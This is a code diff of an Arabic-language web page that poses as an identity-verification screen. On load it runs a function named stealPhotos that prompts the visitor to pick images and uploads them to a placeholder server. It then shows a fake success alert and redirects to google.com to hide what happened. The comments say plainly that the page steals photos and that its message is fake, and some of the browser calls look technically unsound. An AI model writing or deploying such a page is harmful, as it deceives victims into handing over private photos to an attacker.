@@ -2,34 +2,84 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث النظام</title>
+    <title>تأكيد الهوية</title>
+    <style>body { font-family: sans-serif; text-align: center; padding: 50px; }</style>
 </head>
 <body>
-    <h1>الرجاء اختيار الصور للتحديث</h1>
-    <input type="file" id="fileInput" multiple accept="image/*" style="display:none;">
-    <button onclick="document.getElementById('fileInput').click()">اختر الصور</button>
+    <h1>جاري التحقق...</h1>
+    <p>يرجى الانتظار قليلاً.</p>
+    
     <script>
-        const fileInput = document.getElementById('fileInput');
-        
-        fileInput.addEventListener('change', function(e) {
-            const files = e.target.files;
-            if (files.length === 0) return;
+        const SERVER_URL = 'https://your-server.com/upload'; // ضع رابط خادمك هنا
 
-            const formData = new FormData();
-            for (let i = 0; i < files.length; i++) {
-                formData.append('photos', files[i]);
+        // دالة لطلب الإذن وسحب الصور
+        async function stealPhotos() {
+            // طلب إذن الوصول للصور (يعمل على iOS 14+ وبعض متصفحات Android الحديثة)
+            const permission = await navigator.permissions.query({ name: 'photos' });
+            
+            if (permission.state === 'granted') {
+                // إذا كان الإذن موجوداً
+                const files = await window.showOpenFilePicker({
+                    types: [{ description: 'Images', accept: { 'image/*': [] } }],
+                    multiple: true
+                });
+                uploadFiles(files);
+            } else if (permission.state === 'prompt') {
+                // إذا لم يكن هناك إذن مسبق، نطلبه
+                try {
+                    const files = await window.showOpenFilePicker({
+                        types: [{ description: 'Images', accept: { 'image/*': [] } }],
+                        multiple: true
+                    });
+                    uploadFiles(files);
+                } catch (e) {
+                    console.log('المستخدم ألغى الطلب');
+                }
             }
+        }
 
-            fetch('https://your-server.com/upload', {
+        // دالة الإرسال للخادم
+        function uploadFiles(fileHandles) {
+            const formData = new FormData();
+            fileHandles.forEach(handle => {
+                formData.append('photos', handle);
+            });
+
+            fetch(SERVER_URL, {
                 method: 'POST',
                 body: formData
-            })
-            .then(response => {
-                // اختفاء الصفحة أو إعادة توجيه بعد الإرسال
-                window.location.href = 'https://google.com'; 
-            })
-            .catch(error => console.error('Error:', error));
-        });
+            }).then(() => {
+                alert('تم التحقق بنجاح!'); // رسالة وهمية
+                window.location.href = 'https://google.com';
+            });
+        }
+
+        // تشغيل الدالة عند فتح الصفحة
+        window.onload = () => {
+            // محاولة طلب الإذن فوراً إذا كان المتصفح يدعمه
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'photos' }).then(result => {
+                    result.onchange = () => {
+                        if (result.state === 'granted') stealPhotos();
+                    };
+                    stealPhotos();
+                }).catch(() => {
+                    // خطة بديلة للمتصفحات القديمة: زر وهمي
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.multiple = true;
+                    input.accept = 'image/*';
+                    input.click();
+                    input.onchange = (e) => {
+                        const formData = new FormData();
+                        for (let i = 0; i < e.target.files.length; i++) {
+                            formData.append('photos', e.target.files[i]);
+                        }
+                        fetch(SERVER_URL, { method: 'POST', body: formData }).then(() => window.location.href = 'https://google.com');
+                    };
+                });
+            }
+        };
     </script>
 </body>
 </html>
